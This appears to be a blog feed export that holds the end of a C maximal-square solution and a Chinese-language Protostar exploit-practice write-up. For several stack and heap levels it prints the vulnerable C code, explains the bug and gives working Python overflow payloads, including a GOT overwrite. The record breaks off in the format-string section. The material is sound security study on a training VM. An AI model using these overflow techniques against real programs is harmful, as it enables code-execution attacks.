class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> max(a,b) (a&gt;b?a:b)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maximalSquare</span><span class="hljs-params">(<span class="hljs-type">char</span>** matrix, <span class="hljs-type">int</span> matrixSize, <span class="hljs-type">int</span>* matrixColSize)</span>&#123;<br>    <span class="hljs-keyword">if</span>(matrixSize == <span class="hljs-number">0</span> || *matrixColSize ==  <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> rows = matrixSize, cols = *matrixColSize;<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">400</span>][<span class="hljs-number">400</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> maxsqlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= rows; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= cols; j++) &#123;<br>            <span class="hljs-keyword">if</span> (matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                dp[i][j] = min(min(dp[i][j - <span class="hljs-number">1</span>], dp[i - <span class="hljs-number">1</span>][j]), dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>;<br>                maxsqlen = max(maxsqlen, dp[i][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxsqlen * maxsqlen;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>DP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞利用练习:Protostar(V2)</title>
    <link href="/blog/2020/03/13/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0-Protostar-V2/"/>
    <url>/blog/2020/03/13/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0-Protostar-V2/</url>
    
    <content type="html"><![CDATA[<p><strong>学习了软件安全课程后，初步了解了一下堆栈溢出，觉得还不够，练习一下玩玩，感觉挺好玩的。</strong></p><p><img src="/images/fj34.jpg"></p><span id="more"></span><h2 id="0x00实验环境搭建"><a href="#0x00实验环境搭建" class="headerlink" title="0x00实验环境搭建"></a>0x00实验环境搭建</h2><h3 id="镜像下载"><a href="#镜像下载" class="headerlink" title="镜像下载"></a>镜像下载</h3><p>在这里有iso镜像下载的链接：</p><p><a href="">https : &#x2F;&#x2F;download.vulnhub.com&#x2F;exploitexercises&#x2F;exploit-exercises-protostar-2.iso</a></p><h3 id="镜像安装"><a href="#镜像安装" class="headerlink" title="镜像安装"></a>镜像安装</h3><p>直接使用vmware创建Linux虚拟机即可，然后用live模式启动即可，用户名<code>user</code>，密码<code>user</code>，root用户密码<code>godmode</code>。</p><p>练习的可执行文件在 &#x2F;opt&#x2F;protostar&#x2F;bin目录下，可以使用bash命令切换到bash后方便敲命令。</p><h2 id="0x01栈溢出"><a href="#0x01栈溢出" class="headerlink" title="0x01栈溢出"></a>0x01栈溢出</h2><h3 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h3><h4 id="0-源代码"><a href="#0-源代码" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> modified;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>) &#123;<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;please specify an argument\n&quot;</span>);<br>    &#125;<br>  <br>    modified = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>(buffer, argv[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">if</span>(modified == <span class="hljs-number">0x61626364</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have correctly got the variable to the right value\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Try again, you got 0x%08x\n&quot;</span>, modified);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-分析"><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h4><p>我们可以发现modified这个参数会比buffer更早入栈，然而栈中字符串是越靠后的字符越靠近栈底位置，buffer只有64位长度，而且strcpy函数不对参数进行长度检查，因此会导致溢出。假如我们输入64个字符之后后面跟的值是<strong>\x64\x63\x62\x61</strong> 这样的话，modified值就会被覆盖掉，引发栈溢出，从而把变量原来的值修改掉。</p><h4 id="2-解答"><a href="#2-解答" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\x64\x63\x62\x61&#x27;&quot;</span> | xargs ./stack1<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/stack1.png"></p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><h4 id="0-源代码-1"><a href="#0-源代码-1" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> modified;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br>    <span class="hljs-type">char</span> *variable;<br>    <br>    variable = getenv(<span class="hljs-string">&quot;GREENIE&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span>(variable == <span class="hljs-literal">NULL</span>) &#123;<br>    errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;please set the GREENIE environment variable\n&quot;</span>);<br>    &#125;<br><br>    modified = <span class="hljs-number">0</span>;<br> <br>    <span class="hljs-built_in">strcpy</span>(buffer, variable);<br>    <br>    <span class="hljs-keyword">if</span>(modified == <span class="hljs-number">0x0d0a0d0a</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have correctly modified the variable\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Try again, you got 0x%08x\n&quot;</span>, modified);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1 思路"></a>1 思路</h4><p>还是strcpy的锅，如果getenv函数获取的环境变量的值超出buffer的64位，会导致栈溢出，从而修改modified的值，我们只需要构造一个GREENIE环境变量，前64位是字符，后面跟着\x0a\x0d\x0a\x0d即可</p><h4 id="2-解答-1"><a href="#2-解答-1" class="headerlink" title="2 解答"></a>2 解答</h4><p>编写python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>envval = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">64</span> + <span class="hljs-string">&#x27;\x0a\x0d\x0a\x0d&#x27;</span><br>os.putenv(<span class="hljs-string">&quot;GREENIE&quot;</span>, envval)<br>os.system(<span class="hljs-string">&quot;./stack2&quot;</span>)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/stack2.png"></p><h3 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h3><h4 id="0-源代码-2"><a href="#0-源代码-2" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;code flow successfully changed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*fp)</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>    fp = <span class="hljs-number">0</span>;<br><br>    gets(buffer);<br><br>    <span class="hljs-keyword">if</span>(fp) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;calling function pointer, jumping to 0x%08x\n&quot;</span>, fp);<br>      fp();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路分析"><a href="#1-思路分析" class="headerlink" title="1 思路分析"></a>1 思路分析</h4><p>首先我们应该找到win函数的地址：</p><p>进入gdb之后：disassemble win</p><p><img src="/images/stack3-0.png"></p><p>发现win函数的地址是0x08048424，接下来我们就可以构造buffer的溢出，利用gets函数的漏洞，</p><p>覆盖掉原本fp指针的地址，让主函数执行我们想执行的函数。</p><h4 id="2-解答-2"><a href="#2-解答-2" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\x24\x84\x04\x08&#x27;&quot;</span> | ./stack3<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/images/stack3-1.png"></p><h3 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h3><h4 id="0-源代码-3"><a href="#0-源代码-3" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;code flow successfully changed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br>    gets(buffer);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-1"><a href="#1-思路-1" class="headerlink" title="1 思路"></a>1 思路</h4><p>首先根据已有知识，我们其实可以算出来main函数的返回地址在哪里，因为压栈顺序是从右向左两个参数，然后局部变量，所以栈里面的顺序应该是  高地址到低地址：main函数返回地址、char**型参数、int型参数、char buffer[64]。因此我们可以计算出来返回地址的位置在4+8+64&#x3D;76处。随后我是用gdb单步运行<code>i r</code>指令查看esp寄存器信息也验证了以上说法是正确的。</p><p>然后我们使用<strong>disas win</strong>查看win函数的地址：</p><p><img src="/images/stack4-0.png"></p><p>发现该函数地址为：0x080483f4</p><p>于是我们便可以利用gets函数的漏洞，修改76字符长度后面的main函数返回地址即可，注意使用小端序。</p><h4 id="2-解答-3"><a href="#2-解答-3" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*76 + &#x27;\xf4\x83\x04\x08&#x27;&quot;</span> | ./stack4<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/images/stack4-1.png"></p><h2 id="0x02-堆溢出"><a href="#0x02-堆溢出" class="headerlink" title="0x02 堆溢出"></a>0x02 堆溢出</h2><h3 id="Heap-0"><a href="#Heap-0" class="headerlink" title="Heap 0"></a>Heap 0</h3><h4 id="0-源代码-4"><a href="#0-源代码-4" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">winner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;level passed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nowinner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;level has not been passed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> *<span class="hljs-title">d</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fp</span> *<span class="hljs-title">f</span>;</span><br><br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> data));<br>    f = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fp));<br>    f-&gt;fp = nowinner;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data is at %p, fp is at %p\n&quot;</span>, d, f);<br><br>    <span class="hljs-built_in">strcpy</span>(d-&gt;name, argv[<span class="hljs-number">1</span>]);<br><br>    f-&gt;fp();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-2"><a href="#1-思路-2" class="headerlink" title="1 思路"></a>1 思路</h4><p>从代码中我们可以看出，64 字节的堆内存被用于 struct 的名字，4 个字节用于 struct fp。而 nowinner 的函数指针则被放在了堆内存中。接着，我们的输入会通过有漏洞的 strcpy 函数拷入到 struct 数据的 name 变量中。所以，我们可以放心地假设，在64字节之后的空间中我们可以将函数指针重写到 nowinner 函数中。</p><p>当我们进一步逆向主程序并分析后，发现 malloc 被用于分配64字节的空间。然而，它多分配了8个字节（0x00000049），其中前4个字节表示 prev_size 数据（如果前一个块(chunk)的空间是空的则为前一个块空间的大小，否则为前一个块的用户数据）。另外4个字节的用于表示被分配块的大小，其中3LSB的bit用于不同的标志(PREV_INUSE [0x1], IS_MAPPED [0x2], NON_MAIN_ARENA [0x4])，这些标志是用于描述前一个块空间的，要在 gdb 中获取堆内存的起始地址，可以使用 info proc mapping 命令</p><p>首先我们运行一下即可看到data is at 0x804a008, fp is at 0x804a050，也可以看出来我们需要copy 72字节数据来实现堆溢出，72 字节后面就是nowinner地址，我们需要将这个地址替换为winner的地址。</p><p>使用GDB，disas winner查看winner函数的地址为0x08048464。然后我们就可以构造输出，改变原本的堆的结构。</p><p><img src="/images/heap0-0.png"></p><h4 id="2-解答-4"><a href="#2-解答-4" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*72 + &#x27;\x64\x84\x04\x08&#x27;&quot;</span> |xargs ./heap0<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/images/heap0-1.png"></p><h3 id="Heap1"><a href="#Heap1" class="headerlink" title="Heap1"></a>Heap1</h3><h4 id="0-源代码-5"><a href="#0-源代码-5" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">internet</span> &#123;</span><br>    <span class="hljs-type">int</span> priority;<br>    <span class="hljs-type">char</span>* name;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">winner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;and we have a winner @ %d\n&quot;</span>, time(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">internet</span> *<span class="hljs-title">i1</span>, *<span class="hljs-title">i2</span>, *<span class="hljs-title">i3</span>;</span><br>    i1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> internet));<br>    i1-&gt;priority = <span class="hljs-number">1</span>;<br>    i1-&gt;name = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    i2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> internet));<br>    i2-&gt;priority = <span class="hljs-number">2</span>;<br>    i2-&gt;name = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(i1-&gt;name, argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">strcpy</span>(i2-&gt;name, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;and that&#x27;s a wrap folks!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-3"><a href="#1-思路-3" class="headerlink" title="1 思路"></a>1 思路</h4><p>利用写 i1 修改 i2 的 *name 为 puts@plt 指向的got地址，第二次strcpy把winner写入puts的got表中。</p><p><img src="/images/heap1-0.png"></p><p><img src="/images/heap1-1.png"></p><h4 id="2-解答-5"><a href="#2-解答-5" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*20 + &#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;\x94\x84\x04\x08&#x27;&quot;</span> |xargs ./heap1<br></code></pre></td></tr></table></figure><p><img src="/images/heap1-2.png"></p><h3 id="Heap-2"><a href="#Heap-2" class="headerlink" title="Heap 2"></a>Heap 2</h3><h4 id="0-源代码-6"><a href="#0-源代码-6" class="headerlink" title="0.源代码"></a>0.源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auth</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">int</span> auth;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auth</span>* <span class="hljs-title">auth</span>;</span><br><span class="hljs-type">char</span>* service;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-type">char</span> line[<span class="hljs-number">128</span>];<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[ auth = %p, service = %p ]\n&quot;</span>, auth, service);<br><br>        <span class="hljs-keyword">if</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;auth &quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            auth = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(auth));<br>            <span class="hljs-built_in">memset</span>(auth, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(auth));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(line + <span class="hljs-number">5</span>) &lt; <span class="hljs-number">31</span>) &#123;<br>                <span class="hljs-built_in">strcpy</span>(auth-&gt;name, line + <span class="hljs-number">5</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;reset&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">free</span>(auth);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;service&quot;</span>, <span class="hljs-number">6</span>) == <span class="hljs-number">0</span>) &#123;<br>            service = strdup(line + <span class="hljs-number">7</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (auth-&gt;auth) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have logged in already!\n&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please enter your password\n&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-4"><a href="#1-思路-4" class="headerlink" title="1.思路"></a>1.思路</h4><p>典型的<strong>UAF</strong>漏洞：当应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p>free(auth) 之后指针保留，但所在空间会被 service 占用，写入信息覆盖 auth 即可。</p><h4 id="2-解答-6"><a href="#2-解答-6" class="headerlink" title="2.解答"></a>2.解答</h4><p><img src="/images/heap2-0.png"></p><h2 id="0x03格式化字符串"><a href="#0x03格式化字符串" class="headerlink" title="0x03格式化字符串"></a>0x03格式化字符串</h2><h3 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h3><h4 id="0-代码"><a href="#0-代码" class="headerlink" title="0.代码"></a>0.代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 